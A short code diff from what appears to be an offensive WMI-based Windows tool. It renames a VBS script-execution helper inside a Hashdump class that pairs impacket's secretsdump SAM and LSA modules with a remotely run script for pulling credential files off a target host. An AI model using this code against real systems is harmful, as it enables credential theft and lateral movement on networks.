@@ -5,7 +5,7 @@ import time
 import os
 
 from lib.helpers import get_vbs
-from lib.methods.executeVBS import executeVBS_Toolkit
+from lib.methods.executeScript import executeScript_Toolkit
 from lib.methods.classMethodEx import class_MethodEx
 
 from binascii import hexlify
@@ -15,7 +15,7 @@ from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets
 class Hashdump():
     def __init__(self, iWbemLevel1Login, dumpType):
         self.iWbemLevel1Login = iWbemLevel1Login
-        self.executer = executeVBS_Toolkit(self.iWbemLevel1Login)
+        self.executer = executeScript_Toolkit(self.iWbemLevel1Login)
         self.hostname = self.iWbemLevel1Login._INTERFACE__target
         self.save_Path = os.path.join("save", self.hostname)
         self.timeout = 10
@@ -101,7 +101,7 @@ class Hashdump():
         vbs = vbs.replace("RELEACE_WITH_KERNELOBJECT", kernel_object)
         vbs = vbs.replace("RELEACE_WITH_PATH", self.creds_FilesInfo["directory"])
         vbs = vbs.replace("REPLACE_WITH_FILES", ', '.join(f'"{filename}"' for filename in self.creds_FilesInfo["filename"]))
-        tag = self.executer.ExecuteVBS(vbs_content=vbs, returnTag=True, BlockVerbose=True, iWbemServices=self.iWbemServices_subscription)
+        tag = self.executer.ExecuteScript(script_content=vbs, returnTag=True, BlockVerbose=True, iWbemServices=self.iWbemServices_subscription)
 
         for i in range(self.remaining_Time_SS, 0, -1):
             self.logger_countdown.info(f"Waiting {i}s for file extraction.\r")
